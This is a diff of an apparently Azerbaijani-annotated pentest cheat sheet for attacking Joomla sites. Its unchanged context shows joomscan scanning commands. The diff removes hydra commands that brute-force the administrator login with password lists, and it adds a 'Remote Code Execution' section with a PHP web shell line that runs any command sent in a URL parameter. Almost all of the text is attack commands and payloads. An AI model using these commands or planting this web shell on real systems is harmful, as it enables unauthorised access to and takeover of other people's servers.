@@ -68,16 +68,11 @@ joomscan --url https://target.com -ec
 joomscan --url https://target.com \
          --output report.txt
 ```
+---
+<img width="898" height="577" alt="image" src="https://github.com/user-attachments/assets/8b79ef93-36d3-4fb9-8411-229d117113b4" />
 
-# BruteForce
+# Remote Code Execution
 ```powershell
-# HTTP POST form brute force
-hydra -l admin -P rockyou.txt target.com \
-      http-post-form \
-      "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:Invalid"
+system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
 
-# User listindən
-hydra -L users.txt -P passwords.txt target.com \
-      http-post-form \
-      "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:Invalid"
 ```
